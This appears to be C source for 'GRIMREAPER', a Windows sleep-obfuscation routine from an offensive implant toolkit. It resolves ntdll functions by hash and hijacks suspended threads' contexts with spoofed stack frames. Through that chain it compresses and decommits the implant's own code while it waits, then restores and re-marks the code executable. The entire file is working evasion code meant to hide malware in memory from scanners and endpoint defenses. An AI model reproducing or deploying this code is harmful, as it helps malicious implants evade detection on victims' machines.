/*!
 *
 * GRIMREAPER
 *
 * Austin Hudson
 *
 * suspicious.actor
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( NtSignalAndWaitForSingleObject );
	D_API( RtlGetCompressionWorkSpaceSize );
	D_API( NtQueryInformationThread );
	D_API( NtWaitForSingleObject );
	D_API( NtSetContextThread );
	D_API( NtGetContextThread );
	D_API( RtlCompressBuffer );
	D_API( NtDuplicateObject );
	D_API( NtTerminateThread );
	D_API( NtQueueApcThread );
	D_API( NtCreateThreadEx );
	D_API( NtResumeThread );
	D_API( NtCreateEvent );
	D_API( NtSetEvent );
	D_API( NtClose );
} API ;

typedef struct
{
	/* Event to wait on */
	HANDLE	EvWait;

	/* Event to sync with */
	HANDLE	EvSync;

	/* Pointer to current RSP */
	PVOID	Csp;
} THREAD_PARAM, *PTHREAD_PARAM ;

/* Static IOCTL */
#define IOCTL_KSEC_ENCRYPT_MEMORY CTL_CODE( FILE_DEVICE_KSEC, 0x03, METHOD_OUT_DIRECT, FILE_ANY_ACCESS )
#define IOCTL_KSEC_DECRYPT_MEMORY CTL_CODE( FILE_DEVICE_KSEC, 0x04, METHOD_OUT_DIRECT, FILE_ANY_ACCESS )

/*!
 *
 * Purpose:
 *
 * A thread 'callback' for acquiring the frame pointer for 
 * this function.
 *
 * The frame is then used to build the fake function frames
 * for the individual threads.
 *
!*/
static D_SEC( B ) DECLSPEC_NOINLINE NTSTATUS NTAPI ThreadCallbackFrameCaptureInternal( _In_ PTHREAD_PARAM Parameter )
{
	/* Set the frame pointer */
	Parameter->Csp = C_PTR( U_PTR( _AddressOfReturnAddress() ) );

	/* Execute ntdll!NtSignalAndWaitForSingleObject */
	( ( __typeof__( NtSignalAndWaitForSingleObject ) * )( PeGetFuncEat(
		PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), 
		OBF_HASH_MAKE( "NtSignalAndWaitForSingleObject" )
	) ) )( Parameter->EvSync, Parameter->EvWait, FALSE, NULL );
};

/*!
 *
 * Purpose:
 *
 * Creates a thread to execute ThreadCallbackFrameCaptureInternal
 * indirectly using context structures and manipulating the entry
 * of RtlUserThreadStart.
 *
 * Returns the frame to the user as well as its full size so that
 * we can fake the frame call with ease.
 *
!*/
static D_SEC( B ) DECLSPEC_NOINLINE NTSTATUS ThreadGetCallbackFrameAndSizeInternal( _Out_ PPVOID FrameBuffer, _In_ PSIZE_T FrameLength )
{
	API			Api;
	CONTEXT			Ctx;
	THREAD_PARAM		Prm;

	NTSTATUS		Nst = STATUS_SUCCESS;

	LPVOID			Stk = NULL;
	HANDLE			Ev1 = NULL;
	HANDLE			Ev2 = NULL;
	HANDLE			Thd = NULL;
	LPVOID			Isp = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Prm, sizeof( Prm ) );

	Api.NtWaitForSingleObject = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtWaitForSingleObject" ) ); 
	Api.NtSetContextThread    = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtSetContextThread" ) );
	Api.NtGetContextThread    = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtGetContextThread" ) );
	Api.NtTerminateThread     = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtTerminateThread" ) );	
	Api.NtCreateThreadEx      = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtCreateThreadEx" ) );
	Api.NtResumeThread        = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtResumeThread" ) );
	Api.NtCreateEvent         = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtCreateEvent" ) );
	Api.NtSetEvent            = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtSetEvent" ) );
	Api.NtClose               = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtClose" ) );

	do 
	{
		/* Get the DOS header of the current profcess */
		Dos = C_PTR( NtCurrentPeb()->ImageBaseAddress );

		/* Get the NT header of the current process */
		Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );

		/* Spawn a thread @ ThreadCallbackFrameCaptureInternal suspended */
		Nst = Api.NtCreateThreadEx( &Thd, 
					    THREAD_ALL_ACCESS, 
					    NULL, 
					    NtCurrentProcess(), 
					    C_PTR( U_PTR( Dos ) + Nth->OptionalHeader.AddressOfEntryPoint ), 
					    &Prm, 
					    TRUE, 
					    0,
					    0,
					    0,
					    NULL );

		/* Thread creation failed. */
		if ( ! NT_SUCCESS( Nst ) ) {
			/* Abort! */
			break;
		};

		/* Get the thread context */
		Ctx.ContextFlags = CONTEXT_FULL;
		Nst = Api.NtGetContextThread( Thd, &Ctx );

		/* Failed to get the context info */
		if ( ! NT_SUCCESS( Nst ) ) {
			/* Abort! */
			break;
		};

		/* Redirect to our target routine */
		#if defined( _WIN64 )
		Ctx.Rcx = U_PTR( G_PTR( ThreadCallbackFrameCaptureInternal ) );
		Ctx.Rdx = U_PTR( &Prm );
		Isp = C_PTR( Ctx.Rsp );
		#else
		Ctx.Eax = U_PTR( G_PTR( ThreadCallbackFrameCaptureInternal ) );
		Ctx.Ebx = U_PTR( &Prm );
		Isp = C_PTR( Ctx.Esp );
		#endif

		/* Set the new context */
		Ctx.ContextFlags = CONTEXT_FULL;
		Nst = Api.NtSetContextThread( Thd, &Ctx );

		/* Failed to set the new context */
		if ( ! NT_SUCCESS( Nst ) ) {
			/* Abort! */
			break;
		};

		/* Create the event to notify the thread is blocking */
		Nst = Api.NtCreateEvent( &Ev1, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );

		/* Failed to create the event */
		if ( ! NT_SUCCESS( Nst ) ) {
			/* Abort! */
			break;
		};

		/* Create the event to nofiy for the thread to teardown */
		Nst = Api.NtCreateEvent( &Ev2, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );

		/* Failed to creat the event */
		if ( ! NT_SUCCESS( Nst ) ) {
			/* Abort! */
			break;
		};

		/* Set our thread parameter function parameters */
		Prm.EvSync = C_PTR( Ev1 );
		Prm.EvWait = C_PTR( Ev2 );

		/* Resume the thread */
		Nst = Api.NtResumeThread( Thd, NULL );

		/* Failed to reusme the thread */
		if ( ! NT_SUCCESS( Nst ) ) {
			/* Abort! */
			break;
		};

		/* Wait for a signal */
		Nst = Api.NtWaitForSingleObject( Ev1, FALSE, NULL );

		/* Failed to wait or reached a timeout */
		if ( ! NT_SUCCESS( Nst ) ) {
			/* Abort! */
			break;
		};

		/* Allocate a block to hold the stack frames */
		Stk = MemoryAlloc( U_PTR( Isp ) - U_PTR( Prm.Csp ) );

		/* Failed to allocate the block of memory */
		if ( ! Stk ) {
			/* Set the status to no memory was allocated */
			Nst = STATUS_NO_MEMORY;

			/* Abort! */
			break;
		};

		/* Copy over the stack used */
		__builtin_memcpy( Stk, Prm.Csp, U_PTR( Isp ) - U_PTR( Prm.Csp ) );

		/* Allocate the full frame size */
		*FrameBuffer = Stk;
		*FrameLength = U_PTR( Isp ) - U_PTR( Prm.Csp ); 
	} while ( 0 );

	if ( Ev2 != NULL ) {
		/* Close the handle */
		Api.NtClose( Ev2 );
	};
	if ( Ev1 != NULL ) { 
		/* Close the handle */
		Api.NtClose( Ev1 );
	};
	if ( Thd != NULL ) {
		/* Terminate it & close it! */
		Api.NtTerminateThread( Thd, STATUS_SUCCESS );
		Api.NtClose( Thd );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Prm, sizeof( Prm ) );

	/* Return the status */
	return Nst;
};

/*!
 *
 * Purpose:
 *
 * Makes a 'obfuscated' call with a proper thread frame 
 * so that we both look 'normal' according to the thread
 * offsets.
 *
 * On success you will recieve a thread handle that can
 * be used to block the next call.
 *
!*/
static D_SEC( B ) DECLSPEC_NOINLINE NTSTATUS ThreadSetCallInternal( _Out_ PHANDLE ThreadHandle,
								    _In_ HANDLE BlockingHandle, 
								    _In_ PVOID StackFrame, 
								    _In_ SIZE_T StackFrameSize, 
								    _In_ PVOID Function,
								    _In_ UINT32 Arguments,
								    ... )
{
	API			Api;
	va_list			Lst;
	
	HANDLE			Thd = NULL;
	LPVOID			Ret = NULL;
	PCONTEXT		Ctx = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;

	NTSTATUS		Nst = STATUS_SUCCESS;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Lst, sizeof( Lst ) );

	Api.NtWaitForSingleObject = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtWaitForSingleObject" ) );
	Api.NtSetContextThread    = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtSetContextThread" ) );
	Api.NtGetContextThread    = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtGetContextThread" ) );
	Api.NtDuplicateObject     = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtDuplicateObject" ) );
	Api.NtTerminateThread     = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtTerminateThread" ) );
	Api.NtQueueApcThread      = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtQueueApcThread" ) );
	Api.NtCreateThreadEx      = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtCreateThreadEx" ) );
	Api.NtResumeThread        = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtResumeThread" ) );
	Api.NtClose               = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtClose" ) );

	/* Parse the arguments list */
	va_start( Lst, Arguments );

	do 
	{
		/* Get the DOS header of the current PE */
		Dos = C_PTR( NtCurrentPeb()->ImageBaseAddress );

		/* Get the NT header of the current PE */
		Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );

		/* Create a thread targeting the requierd function */
		Nst = Api.NtCreateThreadEx( &Thd,
					    THREAD_ALL_ACCESS,
					    NULL,
					    NtCurrentProcess(),
					    C_PTR( U_PTR( Dos ) + Nth->OptionalHeader.AddressOfEntryPoint ),
					    NULL,
					    TRUE,
					    0,
					    0,
					    0,
					    NULL );

		/* Thread creation failed */
		if ( ! NT_SUCCESS( Nst ) ) {
			break;
		};

		/* Allocate a context structure */
		Ctx = MemoryAlloc( sizeof( CONTEXT ) );

		/* Failed to allocate the structure */
		if ( Ctx == NULL ) {

			/* Out of memory! */
			Nst = STATUS_NO_MEMORY;

			/* Abort! */
			break;
		};

		/* Capture the thread registers */
		Ctx->ContextFlags = CONTEXT_FULL;
		Nst = Api.NtGetContextThread( Thd, Ctx );

		/* Failed to capture the context info */
		if ( ! NT_SUCCESS( Nst ) ) {

			/* Abort! */
			break;
		};

		#if defined( _WIN64 )
		/* Adjust the stack to the new offset */
		Ctx->Rsp = Ctx->Rsp - StackFrameSize;

		/* Copy over the entire frame */
		__builtin_memcpy( C_PTR( Ctx->Rsp ), StackFrame, StackFrameSize );

		/* Set the target instruction */
		Ctx->Rip = U_PTR( Function );

		/* Read the return value */
		Ret = C_PTR( *( ULONG_PTR * )( U_PTR( Ctx->Rsp ) ) );

		/* Unset the return address */
		*( ULONG_PTR * )( Ctx->Rsp ) = U_PTR( NULL );

		/* Adjust the stack */
		Ctx->Rsp = U_PTR( Ctx->Rsp + 0x20 );

		/* Do we have more than 4 arguments? */
		if ( Arguments > 4 ) {
			Ctx->Rsp = U_PTR( Ctx->Rsp - ( ( sizeof( ULONG_PTR ) * ( Arguments - 5 ) ) ) );
		};

		/* Is there 1 arguments? */
		if ( Arguments > 0 ) {
			Ctx->Rcx = va_arg( Lst, ULONG_PTR );
		};
		/* Is there 2 arguments? */
		if ( Arguments > 1 ) {
			Ctx->Rdx = va_arg( Lst, ULONG_PTR );
		};
		/* Is there 3 arguments? */
		if ( Arguments > 2 ) {
			Ctx->R8 = va_arg( Lst, ULONG_PTR );
		};
		/* Is there 4 arguments? */
		if ( Arguments > 3 ) {
			Ctx->R9 = va_arg( Lst, ULONG_PTR );
		};
		/* Is there more than 4 arguments? */
		if ( Arguments > 4 ) {
			/* Loop through and copy each argument to the stack */
			for ( INT Idx = 0 ; Idx < ( Arguments - 4 ) ; ++Idx ) {
				/* "Push" the argument */
				*( ULONG_PTR * )( Ctx->Rsp + ( sizeof( ULONG_PTR ) * ( Idx + 1 ) ) ) = U_PTR( va_arg( Lst, ULONG_PTR ) );
			};
		};

		/* Adjust the stack pointer */
		Ctx->Rsp = U_PTR( Ctx->Rsp - 0x20 );

		/* Set the original return address */
		*( ULONG_PTR * )( Ctx->Rsp ) = U_PTR( Ret );
		#else

		/* ADjust the stack to the new offset */
		Ctx->Esp = Ctx->Esp - StackFrameSize;

		/* Copy over the entire frame */
		__builtin_memcpy( C_PTR( Ctx->Esp ), StackFrame, StackFrameSize );

		/* Set the target instruction */
		Ctx->Eip = U_PTR( Function );

		/* Read the return value */
		Ret = C_PTR( *( ULONG_PTR * )( Ctx->Esp ) );

		/* Unset the return address */
		*( ULONG_PTR * )( Ctx->Esp ) = U_PTR( NULL );

		/* Adjust based on the arguments */
		if ( Arguments > 0 ) {
			Ctx->Esp = ( Ctx->Esp - ( ( sizeof( ULONG_PTR ) * ( Arguments ) ) ) );
		};

		/* Do we have any arguments? */
		if ( Arguments > 0 ) {
			for ( INT Idx = 0 ; Idx < Arguments ; ++Idx ) {
				/* "Push" the argument */
				*( ULONG_PTR * )( Ctx->Esp + ( sizeof( ULONG_PTR ) * ( Idx + 1 ) ) ) = U_PTR( va_arg( Lst, ULONG_PTR ) );
			};
		};

		/* Set the original return address */
		*( ULONG_PTR * )( Ctx->Esp ) = U_PTR( Ret );
		#endif

		/* Set the new registers */
		Ctx->ContextFlags = CONTEXT_FULL;
		Nst = Api.NtSetContextThread( Thd, Ctx );

		/* Failed to set the thread info */
		if ( ! NT_SUCCESS( Nst ) ) {
			/* Abort! */
			break;
		};

		/* Queue an APC to block the call setup until this handle has been signaled */
		Nst = Api.NtQueueApcThread( Thd, C_PTR( Api.NtWaitForSingleObject ), BlockingHandle, FALSE, NULL );

		/* Failed to queue the APC */
		if ( ! NT_SUCCESS( Nst ) ) {
			/* Abort! */
			break;
		};

		/* Resume the thread */
		Nst = Api.NtResumeThread( Thd, NULL );

		/* Failed to resume the target thread */
		if ( ! NT_SUCCESS( Nst ) ) {
			/* Abort! */
			break;
		};

		/* Duplicate the object to the new handle */
		Nst = Api.NtDuplicateObject( NtCurrentProcess(), Thd, NtCurrentProcess(), ThreadHandle, 0, 0, DUPLICATE_SAME_ACCESS );

		/* Failed to duplicate the object */
		if ( ! NT_SUCCESS( Nst ) ) {
			/* Abort! */
			break;
		};

		/* And.....its executed! */
	} while ( 0 );

	/* Free the context structure */
	if ( Ctx != NULL ) {
		MemoryFree( Ctx );
	};
	/* Close the thread handle i*/
	if ( Thd != NULL ) {
		/* Something caused an error. Terminate it! */
		if ( ! NT_SUCCESS( Nst ) ) {
			Api.NtTerminateThread( Thd, STATUS_SUCCESS );
		};
		Api.NtClose( Thd );
	};

	/* End parse the arguments */
	va_end( Lst );


	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Lst, sizeof( Lst ) );

	/* Return the status */
	return Nst;
};

/*!
 *
 * Purpose:
 *
 * A 'obfuscated' version of NtWaitForSingleObject. Waits
 * on a an object and returns the status of the operation
 * on failure or success.
 *
!*/
D_SEC( B ) NTSTATUS NTAPI ObfNtWaitForSingleObject( _In_ HANDLE Handle, _In_ BOOLEAN Alertable, _In_ PLARGE_INTEGER Timeout )
{
	API				Api;
	THREAD_BASIC_INFORMATION	Tbi;

	PVOID				Sfp = NULL;
	PVOID				Cmp = NULL;
	PVOID				Wrk = NULL;
	PVOID				Tmp = NULL;

	HANDLE				Evt = NULL;
	HANDLE				Th1 = NULL;
	HANDLE				Th2 = NULL;
	HANDLE				Th3 = NULL;
	HANDLE				Th4 = NULL;
	HANDLE				Th5 = NULL;
	HANDLE				Th6 = NULL;
	LPVOID				Mem = NULL;

	DWORD				Cln = 0;
	DWORD				Wsp = 0;
	DWORD				Prt = 0;
	SIZE_T				Len = 0;
	SIZE_T				Sfl = 0;
	NTSTATUS			Nst = STATUS_SUCCESS;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Tbi, sizeof( Tbi ) );

	Api.NtSignalAndWaitForSingleObject = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtSignalAndWaitForSingleObject" ) );
	Api.RtlGetCompressionWorkSpaceSize = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "RtlGetCompressionWorkSpaceSize" ) );
	Api.NtQueryInformationThread       = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtQueryInformationThread" ) );
	Api.RtlCompressBuffer              = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "RtlCompressBuffer" ) );
	Api.NtTerminateThread              = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtTerminateThread" ) );
	Api.NtCreateEvent                  = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtCreateEvent" ) );
	Api.NtClose                        = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtClose" ) );

	do
	{
		/* Extract the stack frame & complete length of the frame */
		Nst = ThreadGetCallbackFrameAndSizeInternal( &Sfp, &Sfl );

		/* Unable to extract the frame? */
		if ( ! NT_SUCCESS( Nst ) ) {
			break;
		};

		/* Create a synchronization event */
		Nst = Api.NtCreateEvent( &Evt, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );

		/* Failed to synchronization event */
		if ( ! NT_SUCCESS( Nst ) ) {
			break;
		};

		/* Set our base pointer we are obfuscating */
		Mem = C_PTR( G_PTR( Start ) );

		/* Set the length of the memory we are obfuscating */
		#if defined( _WIN64 )
		Len = U_PTR( U_PTR( GetIp() ) + 11 ) - U_PTR( G_PTR( Start ) );
		#else
		Len = U_PTR( U_PTR( GetIp() ) + 10 ) - U_PTR( G_PTR( Start ) );
		#endif

		/* Query the size of the buffer we want */
		Nst = Api.RtlGetCompressionWorkSpaceSize( COMPRESSION_FORMAT_XPRESS_HUFF | COMPRESSION_ENGINE_MAXIMUM, &Wsp, &( DWORD ){ 0 } );

		/* Failed I guess? */
		if ( ! NT_SUCCESS( Nst ) ) {
			break;
		};

		/* Allocate the workspace */
		Wrk = MemoryAlloc( Wsp );

		/* Workspace could not be allocated */
		if ( Wrk == NULL ) {

			/* Failed */
			Nst = STATUS_NO_MEMORY;

			/* Abort! */
			break;
		};

		/* Allocate memory for the compressed area */
		Cmp = MemoryAlloc( Len );

		/* Could not allocate the memory */
		if ( Cmp == NULL ) {

			/* Failed */
			Nst = STATUS_NO_MEMORY;

			/* Abort! */
			break;
		};

		/* Compress the buffer! */
		Nst = Api.RtlCompressBuffer( COMPRESSION_FORMAT_XPRESS_HUFF | COMPRESSION_ENGINE_MAXIMUM, Mem, Len, Cmp, Len, 0, &Cln, Wrk );

		/* Could not compress :( */
		if ( ! NT_SUCCESS( Nst ) ) {
			/* Abort */
			break;
		};

		/* Resize the buffer to its compressed form */
		Tmp = MemoryReAlloc( Cmp, Cln );

		if ( Tmp == NULL ) {

			/* Failed */
			Nst = STATUS_NO_MEMORY;

			/* Abort! */
			break;
		};

		/* Set the new pointer */
		Cmp = C_PTR( Tmp );

		/* Call NtFreeVirtualMemory */
		Nst = ThreadSetCallInternal(
				&Th1,
				Evt,
				Sfp,
				Sfl,
				PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtFreeVirtualMemory" ) ),
				4,
				NtCurrentProcess(),
				&Mem,
				&Len,
				MEM_DECOMMIT
		);

		if ( ! NT_SUCCESS( Nst ) ) {
			/* Abort! */
			break;
		};

		/* Call NtAllocateVirtualMemory */
		Nst = ThreadSetCallInternal(
				&Th2,
				Th1,
				Sfp,
				Sfl,
				PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtAllocateVirtualMemory" ) ),
				6,
				NtCurrentProcess(),
				&Mem,
				0,
				&Len,
				MEM_COMMIT,
				PAGE_READWRITE
		);

		if ( ! NT_SUCCESS( Nst ) ) {
			/* ABrot! */
		};

		/* Call NtWaitForSingleOBject */
		Nst = ThreadSetCallInternal(
				&Th3,
				Th2,
				Sfp,
				Sfl,
				PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtWaitForSingleObject" ) ),
				3,
				Handle,
				Alertable,
				Timeout
		);

		/* Failed to spawn call to NtWaitForSingleObject! */
		if ( ! NT_SUCCESS( Nst ) ) {
			/* Abort! */
			break;
		};

		/* Call NtAllocateVirtualMemory */
		Nst = ThreadSetCallInternal(
				&Th4,
				Th3,
				Sfp,
				Sfl,
				PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtAllocateVirtualMemory" ) ),
				6,
				NtCurrentProcess(),
				&Mem,
				0,
				&Len,
				MEM_COMMIT,
				PAGE_READWRITE
		);

		/* Failed to spawn a call to NtAllocateVirtualMemory */
		if ( ! NT_SUCCESS( Nst ) ) {
			/* Abort! */
			break;
		};

		/* Call RtlDecompressBufferEx */
		Nst = ThreadSetCallInternal(
				&Th5,
				Th4,
				Sfp,
				Sfl,
				PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "RtlDecompressBufferEx" ) ),
				7,
				COMPRESSION_FORMAT_XPRESS_HUFF | COMPRESSION_ENGINE_MAXIMUM,
				Mem,
				Len,
				Cmp,
				Cln,
				&Len,
				Wrk
		);

		/* Failed to spawn a call to RtlDecompressBufferEx */
		if ( ! NT_SUCCESS( Nst ) ) {
			/* Abort! */
			break;
		};

		/* Call NtProtectVirtualMemory */
		Nst = ThreadSetCallInternal(
				&Th6,
				Th5,
				Sfp,
				Sfl,
				PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtProtectVirtualMemory" ) ),
				5,
				NtCurrentProcess(),
				&Mem,
				&Len,
				PAGE_EXECUTE_READ,
				&Prt 
		);

		/* Failed to spawn a call to NtProtectVirtualMemory */
		if ( ! NT_SUCCESS( Nst ) ) {
			/* Abort! */
			break;
		};

		/* Signal and wait for the last call to complete */
		Nst = Api.NtSignalAndWaitForSingleObject( Evt, Th6, FALSE, NULL );

		/* Failed to signal/and or wait on the thread */
		if ( ! NT_SUCCESS( Nst ) ) {
			break;
		};

		/* Query the exit status of the NtWaitForSingleObject call */
		Nst = Api.NtQueryInformationThread( Th3, ThreadBasicInformation, &Tbi, sizeof( Tbi ), NULL );

		/* Failed to query its basic information */
		if ( ! NT_SUCCESS( Nst ) ) {
			break;
		};

		/* Set the current status based on the threads return */
		Nst = Tbi.ExitStatus;
	} while ( 0 );

	if ( Th6 != NULL ) {
		Api.NtTerminateThread( Th6, STATUS_SUCCESS );
		Api.NtClose( Th6 );
	};
	if ( Th5 != NULL ) {
		Api.NtTerminateThread( Th5, STATUS_SUCCESS );
		Api.NtClose( Th5 );
	};
	if ( Th4 != NULL ) {
		Api.NtTerminateThread( Th4, STATUS_SUCCESS );
		Api.NtClose( Th4 );
	};
	if ( Th3 != NULL ) {
		Api.NtTerminateThread( Th3, STATUS_SUCCESS );
		Api.NtClose( Th3 );
	};
	if ( Th2 != NULL ) {
		Api.NtTerminateThread( Th2, STATUS_SUCCESS );
		Api.NtClose( Th2 );
	};
	if ( Th1 != NULL ) {
		Api.NtTerminateThread( Th1, STATUS_SUCCESS );
		Api.NtClose( Th1 );
	};
	if ( Cmp != NULL ) {
		MemoryFree( Cmp );
	};
	if ( Wrk != NULL ) {
		MemoryFree( Wrk );
	};
	if ( Evt != NULL ) {
		Api.NtClose( Evt );
	};
	if ( Sfp != NULL ) {
		MemoryFree( Sfp );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Tbi, sizeof( Tbi ) );

	/* Return the status */
	return Nst;
};
